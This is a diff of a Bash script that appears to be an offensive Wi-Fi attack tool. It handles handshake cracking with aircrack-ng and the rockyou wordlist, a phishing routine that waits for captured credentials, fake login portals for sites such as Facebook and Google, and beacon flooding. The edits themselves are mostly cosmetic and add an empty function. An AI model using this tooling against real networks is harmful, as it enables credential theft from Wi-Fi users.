@@ -183,11 +183,16 @@ testhandshake() {
 			echo -ne "$blueColour[?]$grayColour Dictionary path to use: " && read dicc
 			$cleancolor; tput civis
 			xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
-		else 
-			pathonher=$(pwd)
-			cd /usr/share/wordlists
-			sudo gunzip -d rockyou.txt.gz
-			cd $pathonher
+		else
+			test -f /usr/share/wordlists/rockyou.txt.gz
+			if [ "$(echo $?)" -eq 0 ]; then
+				pathonher=$(pwd)
+				cd /usr/share/wordlists
+				sudo gunzip -d rockyou.txt.gz
+				cd $pathonher
+			else 
+				echo -e "\n$redColour[!]$grayColour You don't have rockyou.txt in your system or it is in another directory"
+			fi
 		fi
 	else 
 		echo -e "${redColour}\n[!]$grayColour Handshake has not been captured"
@@ -378,7 +383,7 @@ ntwkphishing() {
 		hosts=0 
 		tput civis
 		while true; do
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
+			echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
 			find \-name datos-privados.txt | xargs cat 2>/dev/null
@@ -425,7 +430,7 @@ ntwkphishing() {
 		cd src
 		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
 		tput cnorm
-		echo -ne "\n${yellowColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
+		echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
 		check_logins=0; for login in "${logins[@]}"; do
 			if [ "$login" == "$usedlogin" ]; then
 					check_logins=1
@@ -490,7 +495,7 @@ beaconflood() {
 	
 }
 bannerattack() {
-	echo -e "	    ${blueColour}.--------."
+	echo -e "	   ${blueColour}.--------."
 	echo -e "${redColour}     :  ${blueColour}.-@#*==-!==+#@*-."
 	echo -e "${redColour}     I__________${blueColour}%@%%#*-.${redColour}___"
 	echo -e "${redColour}O====I__________${blueColour}#%%#*-.${redColour}_____>"
@@ -530,6 +535,12 @@ menunomon() {
 	;;
 	esac
 }
+gui() {
+	
+}
+
+
+
 
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
@@ -542,6 +553,7 @@ else
 	tput civis; clear
 	echo -e "${turquoiseColour}"
 	banner
+	echo -e "\n${greenColour}[+]${grayColour} Version [1.0]"
 	echo -e "\n${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
 	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
 	$cleancolor
